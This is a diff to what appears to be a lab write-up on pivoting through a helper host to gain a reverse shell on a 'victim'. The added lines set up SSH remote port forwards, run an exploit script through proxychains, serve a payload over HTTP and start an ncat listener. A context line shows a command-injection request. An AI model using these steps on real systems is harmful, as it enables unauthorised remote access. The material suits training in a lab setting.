@@ -213,9 +213,10 @@ root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=echo+"hel
 
 Exploit this and get the reverse shell directly from `victim` to our `attacker` machine. First, we have to setup a remote forwarding port again and listen for reverse shell connection
 ```bash
-root@attacker:/# ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
-
-root@attacker:/# nc -lvnp 1331
+ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
+proxychains4 -q ./poc.sh 172.16.101.11
+python3 -m http.server 80
+ncat -lvnp 1331
 ```
 
 Next, we send the revershell payload to `victim`
